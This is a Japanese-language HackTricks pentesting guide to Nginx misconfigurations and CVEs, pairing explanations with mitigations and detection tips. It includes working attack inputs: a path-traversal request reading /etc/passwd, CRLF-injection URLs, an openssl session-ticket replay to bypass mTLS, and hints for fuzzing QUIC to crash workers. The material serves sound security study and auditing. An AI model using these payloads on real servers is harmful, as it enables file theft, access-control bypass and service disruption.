# Nginx

{{#include ../../banners/hacktricks-training.md}}


## root location が欠落している <a href="#missing-root-location" id="missing-root-location"></a>

Nginx サーバーを設定する際、**root directive** は配信されるファイルのベースディレクトリを定義することで重要な役割を果たします。以下の例を参照してください：
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
この設定では、`/etc/nginx` が root ディレクトリとして指定されています。この構成により、`/hello.txt` のように指定された root ディレクトリ内のファイルにアクセスできます。しかし、定義されているのは特定の location（`/hello.txt`）だけである点に注意が必要です。root の location（`location / {...}`）に対する設定は存在しません。この省略により、root ディレクティブがグローバルに適用され、ルートパス `/` へのリクエストで `/etc/nginx` 以下のファイルにアクセスできてしまいます。

この設定は重大なセキュリティ上の問題を引き起こします。`GET /nginx.conf` のような単純な `GET` リクエストで、`/etc/nginx/nginx.conf` にある Nginx の設定ファイルが配信され、機密情報が露出する可能性があります。`root` を `/etc` のようなあまり機微なディレクトリに設定することでこのリスクを軽減できますが、それでも他の設定ファイル、アクセスログ、HTTP basic 認証で使われる暗号化された資格情報など、意図しない重要ファイルへのアクセスを許してしまう可能性があります。

## Alias LFI の誤設定 <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

Nginx の設定ファイルでは、"location" ディレクティブを注意深く点検する必要があります。Local File Inclusion (LFI) として知られる脆弱性は、次のような設定を通じて意図せず導入される可能性があります：
```
location /imgs {
alias /path/images/;
}
```
この設定は、サーバが `/imgs../flag.txt` のようなリクエストを、本来のディレクトリ外のファイルへアクセスしようと解釈し、実際には `/path/images/../flag.txt` に解決してしまうため、LFI 攻撃に対して脆弱です。この欠陥により、攻撃者は web 経由でアクセス可能であってはならないサーバの filesystem からファイルを取得できます。

この脆弱性を軽減するため、設定は次のように調整する必要があります:
```
location /imgs/ {
alias /path/images/;
}
```
詳細情報: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Accunetix のテスト:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## 安全でないパス制限 <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

以下のページを確認して、次のようなディレクティブをbypassする方法を学んでください:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## 安全でない変数の使用 / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> 脆弱な変数 `$uri` と `$document_ur`i があり、これらは `$request_uri` に置き換えることで修正できます。
>
> A regex も次のように脆弱になることがあります:
>
> `location ~ /docs/([^/])? { … $1 … }` - Vulnerable
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Not vulnerable (checking spaces)
>
> `location ~ /docs/(.*)? { … $1 … }` - Not vulnerable

Nginx の設定における脆弱性は、以下の例で示されます:
```
location / {
return 302 https://example.com$uri;
}
```
`\r` (Carriage Return) と `\n` (Line Feed) は HTTP リクエストにおける改行文字を示し、その URL エンコードされた形は `%0d%0a` で表されます。これらの文字をリクエスト（例: `http://localhost/%0d%0aDetectify:%20clrf`）に含めた場合、誤設定されたサーバは `Detectify` という名前の新しいヘッダを返します。これは `$uri` 変数が URL エンコードされた改行文字をデコードするためで、レスポンスに予期しないヘッダが追加されるためです:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
CRLF injection と response splitting のリスクの詳細は [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/) を参照してください。

また、この手法は [**explained in this talk**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) で脆弱な例と検出メカニズムが示されています。例えば、ブラックボックスの観点からこのミスコンフィギュレーションを検出するには、次のリクエストが考えられます:

- `https://example.com/%20X` - Any HTTP code
- `https://example.com/%20H` - 400 Bad Request

脆弱であれば、最初のリクエストは "X" が任意の HTTP メソッドとして扱われ応答を返し、2番目は H が有効なメソッドではないためエラーになります。つまりサーバーは `GET / H HTTP/1.1` のようなリクエストを受け取り、これがエラーを引き起こします。

別の検出例は次のとおりです:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Any HTTP code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

その講演で示された脆弱な設定の例は次のとおりです:

- 注目すべきは **`$uri`** が最終的な URL にそのまま設定されている点です。
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- 再び **`$uri`** が URL に含まれている点に注意（今回はパラメータの中）
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- 現在は AWS S3
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### 任意の変数

特定の状況下で、**user-supplied data** が **Nginx 変数** として扱われる可能性があることが発見されました。この挙動の原因はやや不明瞭なままですが、まれでもなく検証も簡単ではありません。この異常は HackerOne 上のセキュリティレポートで取り上げられており、[here](https://hackerone.com/reports/370094) で確認できます。エラーメッセージの追加調査により、[SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365) 内で発生していることが判明し、Server Side Includes (SSI) が根本原因であると特定されました。

この誤設定を**検出する**には、以下のコマンドを実行できます。このコマンドは、Referer ヘッダを設定して変数が出力されるかどうかをテストします:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
この誤設定を対象としたシステム全体のスキャンにより、ユーザがNginxの変数を出力できる複数の事例が明らかになった。ただし、脆弱なインスタンスの数が減少していることから、この問題の修正作業はある程度成功していることが示唆される。

### try_filesと$URI$ARGS変数の使用

以下のNginxの誤設定はLFI脆弱性につながる可能性がある:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
設定では、`try_files` ディレクティブがあり、指定した順序でファイルの存在を確認するために使用されます。Nginx は見つかった最初のものを返します。`try_files` ディレクティブの基本構文は次のとおりです：
```
try_files file1 file2 ... fileN fallback;
```
Nginx は指定された順序でそれぞれのファイルの存在を確認します。ファイルが存在すれば即座に提供されます。指定されたどのファイルも存在しない場合、リクエストは別の URI や特定のエラーページなどのフォールバックオプションに渡されます。

しかし、このディレクティブで `$uri$args` 変数を使用すると、Nginx はリクエスト URI にクエリ文字列引数を結合したものに一致するファイルを探そうとします。したがって、この設定を悪用できます：
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
以下のペイロードを使用して:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
payload を使って root ディレクトリ（Nginx の設定で定義された）を脱出し、`/etc/passwd` を読み込みます。デバッグログで Nginx がファイルをどのように試行するかを確認できます:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC againts Nginx using the configuration mentioned above:
![Example burp request](../../images/nginx_try_files.png)

## バックエンドの生のレスポンスの読み取り

Nginx は `proxy_pass` を通じて、バックエンドが生成したエラーや HTTP ヘッダを傍受し、内部のエラーメッセージやヘッダを隠す機能を提供する。これはバックエンドのエラーに対して Nginx がカスタムエラーページを返すことで実現される。しかし、Nginx が無効な HTTP リクエストに遭遇した場合には問題が生じる。こうしたリクエストは受け取ったままバックエンドに転送され、バックエンドの生のレスポンスが Nginx の介入なしに直接クライアントへ送信される。

uWSGI アプリケーションを想定した例を考える:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
これを管理するために、Nginx の設定では特定のディレクティブが使用されます:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): このディレクティブは、ステータスコードが300より大きいバックエンドの応答に対してNginxがカスタムレスポンスを返すことを可能にします。たとえば、uWSGIアプリケーションでは、`500 Error` の応答がインターセプトされNginxで処理されることを保証します。
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): 名前が示す通り、このディレクティブはクライアントから指定したHTTPヘッダーを隠し、プライバシーとセキュリティを強化します。

有効な `GET` リクエストが行われると、Nginxは通常通り処理を行い、秘匿すべきヘッダーを漏らさない標準のエラーレスポンスを返します。しかし、不正なHTTPリクエストはこの仕組みをバイパスし、生のバックエンド応答（秘密のヘッダーやエラーメッセージを含む）が露出する結果になります。

## merge_slashes set to off

デフォルトでは、Nginxの **`merge_slashes` directive** は **`on`** に設定されており、URL中の複数のスラッシュを単一のスラッシュに圧縮します。この機能はURL処理を簡素化しますが、特にlocal file inclusion (LFI) に脆弱なアプリケーションがNginxの背後にある場合、脆弱性を意図せず隠してしまう可能性があります。セキュリティ研究者の **Danny Robinson and Rotem Bar** は、特にNginxがリバースプロキシとして動作する状況で、このデフォルト動作に関連する潜在的なリスクを指摘しています。

そのようなリスクを軽減するため、これらの脆弱性に影響を受けやすいアプリケーションでは **`merge_slashes` directive を off にする** ことが推奨されます。これにより、NginxがURL構造を変更せずにアプリケーションへリクエストを転送し、根本的なセキュリティ問題を隠蔽しなくなります。

詳細は [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d) を参照してください。

### **Maclicious Response Headers**

[**this writeup**](https://mizu.re/post/cors-playground) に示されているように、Webサーバからの応答に存在するとNginxプロキシの挙動を変える特定のヘッダーがあります。これらはドキュメントでも確認できます: [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/):

- `X-Accel-Redirect`: 指定された場所への内部リダイレクトをNginxに指示します。
- `X-Accel-Buffering`: Nginxがレスポンスをバッファするかどうかを制御します。
- `X-Accel-Charset`: X-Accel-Redirectを使用する際のレスポンスの文字セットを設定します。
- `X-Accel-Expires`: X-Accel-Redirectを使用する際のレスポンスの有効期限を設定します。
- `X-Accel-Limit-Rate`: X-Accel-Redirectを使用する際のレスポンス転送レートを制限します。

例えば、ヘッダー **`X-Accel-Redirect`** はnginx内で内部的な **redirect** を発生させます。したがって、nginx設定に **`root /`** のようなものがあり、Webサーバから **`X-Accel-Redirect: .env`** を含む応答が返されると、nginxは **`/.env`** の内容を送信してしまう（Path Traversal）ことになります。

### **Default Value in Map Directive**

Nginxの設定では、`map` directive が **authorization control** に関与することがよくあります。よくあるミスは **default** 値を指定しないことで、これが未承認アクセスにつながる可能性があります。例えば:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
Without a `default`, a **malicious user** can bypass security by accessing an **undefined URI** within `/map-poc`. [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) advises setting a **default value** to avoid such issues.

### **DNS Spoofing Vulnerability**

DNS spoofing is feasible under certain conditions against Nginx。もし attacker が Nginx が使用する **DNS server** を知り、その DNS queries を傍受できる場合、DNS records を spoof できます。ただし、Nginx が DNS 解決に **localhost (127.0.0.1)** を使うように設定されている場合、この手法は無効です。Nginx では DNS server を次のように指定できます:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` と `internal` ディレクティブ**

The **`proxy_pass`** ディレクティブは、リクエストを内部または外部の他のサーバーへ転送するために使われます。The **`internal`** ディレクティブは、特定の location を Nginx 内部からのみアクセス可能にします。これらのディレクティブ自体は脆弱性ではありませんが、設定の不備がセキュリティの欠陥につながる可能性があるため注意深く確認する必要があります。

## proxy_set_header Upgrade & Connection

If the nginx server is configured to pass the Upgrade and Connection headers an [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) could be performed to access protected/internal endpoints.

> [!CAUTION]
> この脆弱性により攻撃者は **`proxy_pass` エンドポイントへの直接接続を確立できる**（この例では `http://backend:9999`）ため、そのコンテンツは nginx によって検査されません。

Example of vulnerable configuration to steal `/flag` from [here](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> `proxy_pass` が `http://backend:9999/socket.io` のような特定の **path** を指していても、接続は `http://backend:9999` に確立されるため、その内部エンドポイント内の他の任意のパスに **contact** できます。つまり、proxy_pass の URL にパスが指定されていても問題ありません。

## HTTP/3 QUIC module のリモート DoS & leak (2024)

During 2024 Nginx disclosed CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 and CVE-2024-35200 showing that a **single hostile QUIC session** can crash worker processes or leak memory whenever the experimental `ngx_http_v3_module` is compiled in and a `listen ... quic` socket is exposed. Impacted builds are 1.25.0–1.25.5 and 1.26.0, while 1.27.0/1.26.1 ship the fixes; the memory disclosure (CVE-2024-34161) additionally requires MTUs larger than 4096 bytes to surface sensitive data (details in the 2024 nginx advisory referenced below).

**Recon & exploitation hints**

- HTTP/3 is opt-in, so scan for `Alt-Svc: h3=":443"` responses or brute-force UDP/443 QUIC handshakes; once confirmed, fuzz the handshake and STREAM frames with custom `quiche-client`/`nghttp3` payloads to trigger worker crashes and force log leak.
- Quickly fingerprint target support with:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## TLS session resumption bypass of client cert auth (CVE-2025-23419)

2025年2月のアドバイザリは、OpenSSLでビルドされた nginx 1.11.4–1.27.3 が、ある名前ベースのバーチャルホストから別のホスト内で **reusing a TLS 1.3 session** を許してしまうことを公表しました。これにより、証明書不要のホストでネゴシエートしたクライアントが ticket/PSK を再生して `ssl_verify_client on;` で保護された vhost に入り込み、mTLS を完全に回避できます。このバグは、複数の virtual hosts が同じ TLS 1.3 session cache と tickets を共有している場合に発生します（下記の 2025 nginx アドバイザリ参照）。

**攻撃者のプレイブック**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
もしターゲットが脆弱であれば、2回目のハンドシェイクはクライアント証明書を提示せずに完了し、保護された場所が露呈します。

**監査項目**

- `ssl_session_cache shared:SSL` と `ssl_session_tickets on;` を共有する混在した `server_name` ブロック。
- mTLS を期待する Admin/API ブロックが、パブリックホストから共有セッションキャッシュ／チケット設定を継承しているケース。
- vhost の分離を考慮せずに TLS 1.3 のセッション再開をグローバルに有効化する自動化（例：Ansible roles）。

## HTTP/2 Rapid Reset resilience (CVE-2023-44487 behavior)

The HTTP/2 Rapid Reset attack (CVE-2023-44487) は、オペレータが `keepalive_requests` や `http2_max_concurrent_streams` をデフォルト以上に引き上げた場合、nginx に依然影響を与えます: 攻撃者は単一の HTTP/2 接続を開き、数千のストリームで溢れさせた後、直ちに `RST_STREAM` フレームを送出して並行数の上限に到達させず、CPU が切断処理で消耗し続けます。nginx のデフォルト（128 concurrent streams、1000 keepalive requests）は影響範囲を小さく保ちますが、これらの上限を「大幅に」引き上げると、単一クライアントからでもワーカーを枯渇させるのは容易になります（下記の F5 の解説を参照）。

**検出のヒント**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
異常に高い値をそれらのディレクティブで返すホストは格好の標的です：1つのHTTP/2クライアントがストリーム生成と即時の `RST_STREAM` フレームのループを繰り返すことで、同時実行上限に達することなくCPUを消費し続けることができます。

## 実際に試す

Detectifyは、この記事で説明したいくつかの設定ミスを含む脆弱なNginxテストサーバをDockerで構築できるGitHubリポジトリを作成しており、自分で探して試すことができます！

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## 静的解析ツール

### [GIXY](https://github.com/yandex/gixy)

GixyはNginxの設定を解析するツールです。Gixyの主な目的はセキュリティの設定ミスを防ぎ、脆弱性検出を自動化することです。

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwnerは、一般的なNginxの設定ミスや脆弱性を探すためのシンプルなツールです。

## 参考

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
